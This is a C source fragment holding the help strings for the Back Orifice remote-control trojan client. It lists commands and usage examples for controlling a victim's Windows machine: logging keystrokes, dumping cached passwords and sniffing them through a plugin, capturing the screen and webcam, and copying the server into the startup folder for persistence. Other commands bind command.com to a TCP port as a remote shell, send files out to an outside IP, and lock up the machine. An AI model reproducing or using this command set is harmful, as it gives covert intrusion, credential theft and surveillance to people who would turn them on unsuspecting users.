
char hosthelp[] = "\
 HOST - Sets the target host and port\n\
 usage:    host ip port\n\
 example:  host 198.137.241.30 31337";

char quithelp[] =	" QUIT - Exits the Back Orifice client";

char pinghelp[] =	" PING - Pings the current host";

char pinglisthelp[] =	"\
 PINGLIST - Pings a lits of ip addresses in a text file\n\
 usage:    pinglist localfilename\n\
 example:  pinglist C:\bo\\bohosts";

char sweephelp[] =	"\
 SWEEP - Sweeps a subnet with ping packets\n\
 usage:    sweep subnet\n\
 example:  sweep 207.114.140";

char sweeplisthelp[] =	"\
 SWEEPLIST - Sweeps a list of subnets in a text file\n\
 usage:    sweeplist localfilename\n\
 example:  sweeplist c:\\bo\\dialups";

char shellhelp[] =	"SHELL - Opens a command shell";

char statushelp[] =	"STATUS - Displays current software status";

char passwdhelp[] =	"PASSWD - Sets the encryption password for client\n\
 usage:    passwd newpassword";

char dirhelp[] =	"\
 DIR - Display remote files with wildcards\n\
 usage:    dir filespec\n\
 example:  dir c:\\windows\\*.pwl\n\
 note:  If filespec is not provided, a list of the current remote directory is provided";

char cdhelp[] =		"\
 CD - Changes current host directory\n\
 usage:    cd newdirectory\n\
 example:  cd d:\\david\\p0rn0\\movies";

char delhelp[] =	"\
 DEL - Delete a file \n\
 usage:    del filename\n\
 example:  del c:\\windows\\netwatch.exe";

char gethelp[] =	"\
 GET - Transfers a file from remote host to the local computer\n\
 usage:    get remotefilename localfilename\n\
 example:  get c:\\warez\\photoshop.zip c:\\files\\photoshop5.zip\n\
 note:  If localfilename is not provided file is stored in current local directory";

char puthelp[] =	"\
 PUT - Transfers a file from local computer to the remote host\n\
 usage:    put localfilename remotefilename\n\
 example:  put c:\\bo\\boupdate.exe c:\\windows\\system\\b.exe\n\
 note:  If remotefilename is not provided file is stored in current remote directory";

char copyhelp[] =	"\
 COPY - Copy a file\n\
 usage:    copy sourcefilename targetfilename\n\
 example:  copy c:\\windows\\system\\bo.exe \\\\server\\c\\windows\\startm~1\\programs\\startup";

char findhelp[] =	"\
 FIND - Search a directory tree for filespec\n\
 usage:    find filespec root\n\
 example:  find *.avi c:\\";

char freezehelp[] =	"\
 FREEZE - Compresses a file\n\
 usage:    freeze sourcefilename targetfilename\n\
 example:  freeze c:\\windows\\temp\\cap.bmp c:\\windows\\temp\\c";

char melthelp[] =	"\
 MELT - Decompresses a file\n\
 usage:    melt sourcefilename targetfilename\n\
 example:  melt c:\\windows\\temp\\t c:\\windows\\desktop.bmp";

 char viewhelp[] =	"\
 VIEW - Views a textfile\n\
 usage:    view filename\n\
 example:  view c:\\windows\\system.ini";

char renhelp[] =	"\
 REN - Renames a file or directory\n\
 usage:    ren oldfilename newfilename\n\
 example:  ren c:\\windows\\fonts c:\\windows\\f";

char mdhelp[] =		"\
 MD - Makes a directory\n\
 usage:    md directoryname\n\
 example:  md c:\\windows\\temp\\t";

char rdhelp[] =		"\
 RD - Removes a directory\n\
 usage:    rd directoryname\n\
 example:  rd c:\\windows\\fonts";

char infohelp[] =	"\
 INFO - Displays remote system info";

char passeshelp[] =	"\
 PASSES - Displays remote cached passwords";

char dialoghelp[] =	"\
 DIALOG - Displays a dialog box\n\
 usage:    dialog dialogtext titletext\n\
 example:  dialog \"Get back to work you lazy bum!\" \"A message from the management:\"";

char keyloghelp[] =	"\
 KEYLOG - Logs keystrokes to file\n\
 usage:    keylog logfilename\n\
 example:  keylog c:\\windows\\temp\\t\\l\n\
 note:  Use 'keylog stop' to end keyboard logging";

char reboothelp[] =	"\
 REBOOT - Reboots the remote host";

char netviewhelp[] =	"\
 NETVIEW - Display resources available on the network";

char netconnecthelp[] =	"\
 NETCONNECT - Connect to a network resource\n\
 usage:    netconnect netresource password\n\
 example:  netconnect \\server\admin$ s3cur3";

char netdisconnecthelp[] =	"\
 NETDISCONNECT - Disconnects from a network resource\n\
 usage:    netdisconnect netresource\n\
 example:  netdisconnect \\server\admin$";

char netlisthelp[] =	"\
 NETLIST - List current incomming and outgoing network connections";

char resolvehelp[] =	"\
 RESOLVE - Resolves the ip of a hostname from the remote host\n\
 usage:    resolve servername\n\
 example:  resolve server2";

char sharelisthelp[] =	"\
 SHARELIST - Lists exports";

char shareaddhelp[] =	"\
 SHAREADD - Adds an export\n\
 usage:    shareadd sharename localdirectory,password,remark\n\
 example:  shareadd tmp$ \"c:\\,system49,System share\"";

char sharedelhelp[] =	"\
 SHAREDEL - Delete an export\n\
 usage:    sharedel sharename\n\
 example:  sharedel drvc";

char proclisthelp[] =	"\
 PROCLIST - Lists the running processes";

char prockillhelp[] =	"\
 PROCKILL - Kills a running process\n\
 usage:    prockill processid\n\
 example:  prockill 4294651219\n\
 note:  processid's are listed by PROCLIST";

char procspawnhelp[] =	"\
 PROCSPAWN - Spawns a process\n\
 usage:    procspawn exename arguments\n\
 example:  procspawn command.com /C netstat -na > c:\\windows\temp\t";

char listcapshelp[] =	"\
 LISTCAPS - Lists the video capture devices";

char capscreenhelp[] =	"\
 CAPSCREEN - Captures an image of the current screen to a bitmap\n\
 usage:    capscreen bitmapfilename\n\
 example:  capscreen c:\\windows\\temp\\c.bmp";

char capframehelp[] =	"\
 CAPFRAME - Captures a frame from a video capture device to a bitmap\n\
 usage:    capframe bitmapfilename device,width,height,bitplanes\n\
 example:  capframe c:\\windows\\temp\\cap.bmp 0,320,200,16\n\
 note:  If all or part of or part of the device info is not provided default is 0,640,480,16";

char capavihelp[] =	"\
 CAPAVI - Captures video from a video capture device to an AVI\n\
 usage:    capavi avifilename seconds,device,width,height,bitplanes\n\
 example:  capavi c:\\windows\\desktop\\you.avi 10,0,160,120,16\n\
 note:  If all or part of or part of the device info is not provided default is 0,320,240,16";

char soundhelp[] =	"\
 SOUND - Plays a wav file\n\
 usage:    sound wavfilename\n\
 example:  sound c:\\windows\\youare0wned.wav";

char redirlisthelp[] =	"\
 REDIRLIST - Lists the current port redirections";

char redirdelhelp[] =	"\
 REDIRDEL - Deletes a port redirection\n\
 usage:    redirdel redirnumber\n\
 example:  redirdel 0";

char rediraddhelp[] =	"\
 REDIRADD - Adds a port redirection\n\
 usage:    rediradd inputport outputip:port,udp\n\
 example1: rediradd 33331 205.183.56.7:31337,U\n\
 example2: rediradd 1001 207.213.15.11:23\n\
 note:  If no output port is provided the input port is used.";

char appaddhelp[] =	"\
 APPADD - Spawns a console application on a tcp port\n\
 usage:    appadd \"exefilename paramaters\" inport\n\
 example1: appadd command.com 23\n\
 example2: appadd \"netstat -na\" 998";

char appdelhelp[] =	"\
 APPDEL - Removes a console application from the redirected console apps\n\
 usage:    appdel appid\n\
 example:  appdel 0";

char applisthelp[] =	"\
 APPLIST - Lists listening console applications";

char regmakekeyhelp[] =	"\
 REGMAKEKEY - Creates a key in the registry\n\
 usage:    regmakekey keyname\n\
 example:  regmakekey HKEY_LOCAL_MACHINE\\SOFTWARE\\MyWare";

char regdelkeyhelp[] =	"\
 REGDELKEY - Deletes a key from the registry\n\
 usage:    regdelkey keyname\n\
 example:  regdelkey HKEY_LOCAL_MACHINE\\SOFTWARE\\MyWare";

char reglistkeyshelp[] =	"\
 REGLISTKEYS - Lists the subkeys of a key\n\
 usage:    reglistkeys keyname\n\
 example:  reglistkeys HKEY_LOCAL_MACHINE\\SOFTWARE";

char reglistvalshelp[] =	"\
 REGLISTVALS - Lists the values of a key\n\
 usage:    reglistvals keyname\n\
 example:  reglistvals HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Network";

char regdelvalhelp[] =	"\
 REGDELVAL - Deletes a value from a key\n\
 usage:    regdelval valuename\n\
 example:  regdelval HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Run\\netwatcher";

char regsetvalhelp[] =	"\
 REGSETVAL - Sets the value of a key, creating it if it did not already exist\n\
 usage:    regsetval valuename type,value\n\
 example1: regsetval HKEY_LOCAL_MACHINE\\SOFTWARE\\BinaryValue B,08090A0B0C0D0E0F10\n\
 example2: regsetval HKEY_LOCAL_MACHINE\\SOFTWARE\\DwordValue D,54321\n\
 example3: regsetval HLEY_LOCAL_MACHINE\\SOFTWARE\\StringValue \"S,This is a string value\"\n\
 note:  Binary values (type B) are specified in two digit hex values, Dword values (type D) in decimal";

char httponhelp[] =	"\
 HTTPON - Enables the http server\n\
 usage:    httpon port root\n\
 example1: httpon 80 c:\\www\n\
 example2: httpon 9999\n\
 note:  If no root is supplied, all drives are accessable via http";

char httpoffhelp[] =	"\
 HTTPOFF - Dissables the http server";

char tcpsendhelp[] =	"\
 TCPSEND - Connects the server to an ip and sends a file\n\
 usage:    tcpsend filename targetip:port\n\
 example:  tcpsend c:\\file 206.165.128.130:999";

char tcprecvhelp[] =	"\
 TCPRECV - Connects the server to an ip and receives a file\n\
 usage:    tcprecv filename targetip:port\n\
 example:  tcprecv c:\\file 206.165.128.130:999";

char lockuphelp[] =	"\
 LOCKUP - Locks up the remote machine";

char pluginexechelp[] =	"\
 PLUGINEXEC - Execute a plugin\n\
 usage:    pluginexec dllname:pluginname pluginargs\n\
 example:  pluginexec bos:_SniffPasses 0001 c:\\sniff.log";

char pluginkillhelp[] =	"\
 PLUGINKILL - Tells a plugin to terminate\n\
 usage:    pluginkill pluginid\n\
 example:  pluginkill 0";

char pluginlisthelp[] =	"\
 PLUGINLIST - Lists active plugins";

